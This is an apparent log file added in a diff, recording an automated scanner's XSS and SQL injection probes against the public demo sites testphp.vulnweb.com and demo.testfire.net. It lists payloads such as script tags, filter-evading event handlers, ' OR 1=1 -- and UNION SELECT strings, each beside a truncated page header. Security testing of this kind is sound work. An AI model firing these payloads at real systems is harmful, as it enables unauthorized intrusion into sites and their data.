@@ -1,0 +1,2856 @@
+[2025-06-16 08:07:56.658618] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <script>alert(1)</script>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 08:07:57.442048] Vulnerable URL: http://testphp.vulnweb.com
+Payload: "><script>alert(1)</script>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 08:07:58.055882] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <script>alert(XSS);</script>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 08:07:58.773109] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <script>alert(XSS)</script>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 08:07:59.355401] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <<script>alert("XSS");//<</script>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 08:08:00.009970] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <sCripT>alert("XSS")</scRipt>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 08:08:00.722126] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <scr<script>ipt>alert('XSS')</script>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 08:08:01.300298] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <sCripT>alert('XSS')</scRipt>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 08:08:02.057728] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <img src="/" onerror="alert('XSS')"/>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 08:08:02.685137] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <img src=x onMouseOver=alert('XSS')>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 08:08:03.274669] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <svg/onload=eval("ale"+"rt")(`XSS\${alert`XSS`}`)>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 08:08:03.968081] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <img src='nevermind' onerror="alert('XSS');" />
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 08:08:04.568951] Vulnerable URL: http://testphp.vulnweb.com
+Payload: << script>alert("XSS");//<</ script>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 08:08:05.323212] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <svg/onload=alert('XSS')>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 08:08:06.113326] Vulnerable URL: http://testphp.vulnweb.com
+Payload: div.innerHTML = '<script deferred>alert("XSS");</script>'
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 08:08:06.759036] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <img src="aaa" onerror=alert('xxs')>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 08:08:07.580020] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <body onload="alert('XSS')">
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 08:08:08.196820] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR '1'='1
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 08:08:09.013967] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR 1=1 --
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 08:12:43.506507] Vulnerable URL: http://demo.testfire.net/
+Payload: <script>alert(1)</script>
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 08:12:44.086133] Vulnerable URL: http://demo.testfire.net/
+Payload: "><script>alert(1)</script>
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 08:12:45.814358] Vulnerable URL: http://demo.testfire.net/
+Payload: <<script>alert("XSS");//<</script>
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 08:12:46.398379] Vulnerable URL: http://demo.testfire.net/
+Payload: <sCripT>alert("XSS")</scRipt>
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 08:12:46.967112] Vulnerable URL: http://demo.testfire.net/
+Payload: <scr<script>ipt>alert('XSS')</script>
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 08:12:47.551172] Vulnerable URL: http://demo.testfire.net/
+Payload: <sCripT>alert('XSS')</scRipt>
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 08:12:48.131778] Vulnerable URL: http://demo.testfire.net/
+Payload: <img src="/" onerror="alert('XSS')"/>
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 08:12:48.682202] Vulnerable URL: http://demo.testfire.net/
+Payload: <img src=x onMouseOver=alert('XSS')>
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 08:12:49.268880] Vulnerable URL: http://demo.testfire.net/
+Payload: <svg/onload=eval("ale"+"rt")(`XSS\${alert`XSS`}`)>
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 08:12:49.830689] Vulnerable URL: http://demo.testfire.net/
+Payload: <img src='nevermind' onerror="alert('XSS');" />
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 08:12:50.408765] Vulnerable URL: http://demo.testfire.net/
+Payload: << script>alert("XSS");//<</ script>
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 08:12:50.982704] Vulnerable URL: http://demo.testfire.net/
+Payload: <svg/onload=alert('XSS')>
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 08:12:51.547996] Vulnerable URL: http://demo.testfire.net/
+Payload: div.innerHTML = '<script deferred>alert("XSS");</script>'
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 08:12:52.147459] Vulnerable URL: http://demo.testfire.net/
+Payload: <img src="aaa" onerror=alert('xxs')>
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 08:12:52.737588] Vulnerable URL: http://demo.testfire.net/
+Payload: <body onload="alert('XSS')">
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 08:12:53.321435] Vulnerable URL: http://demo.testfire.net/
+Payload: ' OR '1'='1
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 08:12:54.101171] Vulnerable URL: http://demo.testfire.net/
+Payload: ' OR 1=1 --
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 18:20:52.179609] Vulnerable URL: http://demo.testfire.net/
+Payload: <script>alert(1)</script>
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 18:20:52.757891] Vulnerable URL: http://demo.testfire.net/
+Payload: "><script>alert(1)</script>
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 18:20:53.320594] Vulnerable URL: http://demo.testfire.net/
+Payload: <img src=x onerror=alert(1)>
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 18:20:53.906290] Vulnerable URL: http://demo.testfire.net/
+Payload: <svg onload=alert(1)>
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 18:20:54.475535] Vulnerable URL: http://demo.testfire.net/
+Payload: ';alert(String.fromCharCode(88,83,83))//
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 18:20:55.056946] Vulnerable URL: http://demo.testfire.net/
+Payload: <iframe src='javascript:alert(1)'>
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 18:20:55.641712] Vulnerable URL: http://demo.testfire.net/
+Payload: <body onload=alert(1)>
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 18:20:56.226975] Vulnerable URL: http://demo.testfire.net/
+Payload: <video><source onerror='alert(1)'>
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 18:20:56.808149] Vulnerable URL: http://demo.testfire.net/
+Payload: <input autofocus onfocus=alert(1)>
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 18:20:57.376564] Vulnerable URL: http://demo.testfire.net/
+Payload: ' OR '1'='1
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 18:20:57.973570] Vulnerable URL: http://demo.testfire.net/
+Payload: ' OR 1=1 --
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 18:20:58.566643] Vulnerable URL: http://demo.testfire.net/
+Payload: ' OR 1=1#
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 18:20:59.160992] Vulnerable URL: http://demo.testfire.net/
+Payload: ' OR 'a'='a
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 18:20:59.738600] Vulnerable URL: http://demo.testfire.net/
+Payload: ' OR ''='
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 18:21:00.321575] Vulnerable URL: http://demo.testfire.net/
+Payload: ' OR 1=1 LIMIT 1 -- 
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 18:21:00.878214] Vulnerable URL: http://demo.testfire.net/
+Payload: admin' --
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 18:21:01.444758] Vulnerable URL: http://demo.testfire.net/
+Payload: ' OR 1=1 UNION SELECT null, version() --
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 18:21:02.028090] Vulnerable URL: http://demo.testfire.net/
+Payload: ' OR 1=1 ORDER BY 1 --
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 18:21:02.611593] Vulnerable URL: http://demo.testfire.net/
+Payload: ' OR 1=1 AND 1=1 --
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 18:21:03.179578] Vulnerable URL: http://demo.testfire.net/
+Payload: ' AND sleep(5) --
+--- Snippet ---
+
+
+ 
+    
+
+ 
+
+<!-- BEGIN HEADER -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
+
+
+
+<head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content
+
+[2025-06-16 18:25:47.519357] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <script>alert(1)</script>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
